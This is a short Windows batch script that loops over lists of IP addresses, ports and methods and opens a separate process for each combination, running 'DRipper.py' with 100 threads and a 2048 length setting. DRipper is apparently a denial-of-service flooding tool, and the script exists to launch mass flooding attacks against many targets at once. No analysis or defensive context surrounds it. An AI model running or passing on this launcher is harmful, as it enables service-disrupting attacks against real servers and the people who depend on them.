FOR %%i IN (%IP%) DO (
FOR %%p IN (%PORT%) DO (
FOR %%m IN (%METHOD%) DO (
start "%%i | %%p" python DRipper.py -s %%i -p %%p -t 100 -m %%m -l 2048
)
)
)